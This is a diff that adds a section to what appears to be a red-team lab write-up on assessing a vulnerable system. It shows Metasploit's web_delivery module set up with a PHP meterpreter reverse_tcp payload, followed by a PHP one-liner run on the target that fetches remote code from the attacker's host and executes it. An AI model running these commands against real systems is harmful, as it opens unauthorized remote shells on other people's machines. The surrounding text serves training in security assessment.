@@ -129,8 +129,25 @@ We now check Metasploit and see that a meterpreter session has been established.
 ```
 ✨✨ Success. We can then proceed to privilege escalation if it's required. ✨✨
 
-```
 
+The final exploit is using Metasploit's web delivery script.
+If the attacker has access to the target machine, which we do via Ryan's ssh, a meterpreter and shell can be established.
+
+$ msfconsole
+$ use exploit/multi/script/web_delivery
+$ set target 1
+$ set payload php/meterpreter/reverse_tcp
+$ set lhost 192.168.1.90
+$ run
+
+This will get the exploit running and waiting for taget machine to start a connection.
+To do that, the exploit provides us with the command line to use.
+We could try to obfuscate this command if we were trying to be stealthy.
+In this case however, we already have access vis Ryan's ssh session, so we run this command on that target machine.
+
+$ php –d allow_url_fopen=true –r “eval(file_get_contents(‘http://192.168.1.90:8080/9Jbe8KjZ’));”
+```
+<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Webdelivery.png></kbd>
 
 
 
